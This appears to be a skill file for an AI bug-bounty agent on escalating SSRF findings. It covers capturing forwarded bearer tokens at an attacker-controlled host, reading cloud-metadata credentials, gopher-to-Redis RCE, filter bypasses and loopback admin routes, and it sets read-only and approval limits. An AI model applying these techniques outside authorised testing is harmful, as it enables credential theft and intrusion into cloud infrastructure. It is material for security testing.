# Escalation — turn reach into High/Critical

Reflection > blind; caller-token-forwarding > reflection; IMDS-creds/RCE = top tier.
A confirmed sink and even a metadata reach is only Medium if you stop at "the server
fetched." Climb to the concrete impact below. Escalate only as far as needed to prove
the class (safe-ladder), but DO reach it — stopping one rung below proof is the failure
this skill exists to kill.

## Contents

- 1. Caller-token forwarding — the High/Critical lifter
- 2. Reflected internal reads — chase the body-leak sink
- 3. AI `image_url` fetch vector — recurring, high-recurrence surface
- 4. IMDS creds → assume the cloud role (Critical potential)
- 5. gopher → internal service → data / RCE
- 6. Loopback admin bypass → internal-only functionality
- Resolve any leaked key before reporting it
- Severity calibration

---

## 1. Caller-token forwarding — the High/Critical lifter

**Always check whether the outbound request carries the caller's auth.** Some
fetchers/proxies/MCP tools attach the caller's `Authorization: Bearer` (or a session
cookie, or an internal service token) to the outbound request. If they do, point the
fetch at your OOB host and the listener **receives the victim's token** → account
takeover / cross-service access.

- Fire the SSRF at your interactsh/OOB host and inspect the captured request headers
  for `Authorization`, `Cookie`, `X-Api-Key`, `X-Amz-Security-Token`, internal service
  JWTs.
- MCP example (typically converts **High**): `tools/call <import-url-tool>` with
  `authorUrl: https://attacker/` forwarded a 24h token scoped with broad
  service/API/write scopes; the same server also reached IMDS.
- Prove it read-only: capture the token, decode it (scopes/`exp`/`aud`), make **one**
  non-PII call as yourself with it to show it is live and over-privileged (rung 1). Do
  NOT harvest other users' tokens at scale — one captured token proves the class.

## 2. Reflected internal reads — chase the body-leak sink

If the tool result / error / a status endpoint returns the fetched body, you can READ
internal responses — full-body reflection at an **async status/job endpoint keyed by a
job id** (the predict/inference call returns an id, a separate status/result route echoes
the fetched body) is the highest-value reflected-read sink and typically lifts SSRF to
**High**.

- Hunt every place the fetched content could surface: the immediate tool response, an
  async job/prediction/status endpoint keyed by an id, the error message body, a
  "preview" render, generated PDF/screenshot output, an import result.
- Once you have a reflection sink, read metadata (`169.254.169.254/latest/...`),
  loopback admin routes (`127.0.0.1/<admin>`), and internal service responses directly.
- Reflection turns a blind Medium into a High: you are exfiltrating internal data, not
  just proving a request.

## 3. AI `image_url` fetch vector — recurring, high-recurrence surface

Any AI/ML feature taking a user URL for "analysis / similarity / describe / edit /
inpaint / multimodal chat" fetches it server-side **before** validating it is an image.
This is a high-recurrence SSRF surface (see `case-patterns.md` for the
generalized meta-pattern). Param shapes to hit:

```
attachments[].url
image_url.url                     # OpenAI-style messages[].content[].type:image_url
search_parameters[similar_url]
inputs.href  + storage:"external"
inputs.image_in.repo:path         + repoType:"HTTP"
presignedUrl
```

Callback UAs that confirm the internal fetcher: `node`, `Go-http-client`,
`python-requests`, `libcurl`, plus opaque internal-service UAs (e.g. `CPF`, `IPS/1.0`,
`Imagecore Service`). The `x-api-key` / `X-Api-Key` is usually a **public client_id**
baked into the web app (`<public-client-id>`) — that is not the finding, the SSRF is.
Replay: find every URL field → OOB-confirm + capture egress/trace headers → if
blocked, `userinfo@`/`sslip.io`/decimal/redirector → probe `169.254.169.254`,
`127.0.0.1`, internal stage hosts → time open vs closed → find the reflection sink →
check the allowlist for `*.s3.amazonaws.com` wildcards (attacker S3 accepted).

## 4. IMDS creds → assume the cloud role (Critical potential)

Reading the creds is rung 1 (done in `cloud-metadata.md`). To escalate:
- **Prove live + over-privileged, read-only**: `aws sts get-caller-identity` (AWS —
  `aws` CLI absent; **`boto3` (1.43.18) is installed and signs SigV4** — no
  `curl` equivalent), or decode the Azure/GCP token with `jq` and read its scopes, then
  one non-PII list. That alone proves "SSRF yields live cloud credentials."
- **Hand the pivot to `cloud-exploitation`** — S3 read, internal API, DynamoDB — and
  **ask d0x directly before executing** (rung 5) or do it on UAT (rung 4). Never dump another tenant's
  data or write to prove scale; state scale by inference.

## 5. gopher → internal service → data / RCE

If `gopher://` works (`bypass-ladder.md` rung 8) you can send arbitrary
bytes to a TCP service on loopback/internal:
- **Redis 6379**: `INFO`/`CLIENT LIST` reads prove reach. (Writing `CONFIG SET
  dir/dbfilename` → webshell/SSH-key is the classic gopher-Redis RCE, but that is
  destructive/state-changing on real infra — **d0x's approval before execution, rung 5**; prove reach with a
  read, describe the RCE by inference.)
- **memcached 11211 / Elasticsearch 9200 / internal HTTP admin**: read a
  key/`/_cat/indices`/an admin GET to prove data access.
- **SMTP 25 / internal APIs**: banner/`EHLO` read to prove reach.

## 6. Loopback admin bypass → internal-only functionality

`127.0.0.1:<port>` frequently bypasses the ingress that enforces auth → reach the
app's own admin/internal routes and sibling microservices. Enumerate internal route
families surfaced in the JS (`js-source-to-sink`) and hit them via the SSRF: `/actuator/env`,
`/actuator/heapdump` (Spring — dumps secrets), `/debug/pprof`, internal admin CRUD,
`/metrics`, service-to-service endpoints that trust the loopback origin.

---

## Resolve any leaked key before reporting it

If an SSRF-reached read (loopback config, `/actuator/env`, user-data, an internal
settings page) surfaces a client-side key, resolve it against
`../../_shared/references/public-by-default-keys.md` first:
- **SKIP silently**: Sentry DSN, Datadog client token, analytics write keys, reCAPTCHA
  site key, Stripe `pk_*`, Mapbox/Algolia public tokens, Google Maps browser key.
- **PURSUE to proven impact**: IMDS IAM creds, Azure AD `client_secret`, Stripe
  `sk_live_`, Supabase `service_role`/`sb_secret_`, Braze REST key, dotCMS/DB creds,
  non-Maps `AIza` (Gemini). Hand to `exposed-secrets` / `cloud-exploitation`.

The SSRF-reached IMDS/service credential is itself a PURSUE item and the payable core
of the finding.

## Severity calibration

- Blind, recon-only port scan, no internal service of value → Medium/Informative
  (programs deprioritize). State the reach; don't inflate.
- Confirmed metadata-network reach / loopback-admin reach → Medium–High.
- Reflected internal reads, forwarded caller token, or live IMDS creds → High/Critical.
  Validate with `validation` before claiming Critical.

Always report the concrete internal thing you reached — which metadata field, which
loopback route, which forwarded token — never "the server made a request."
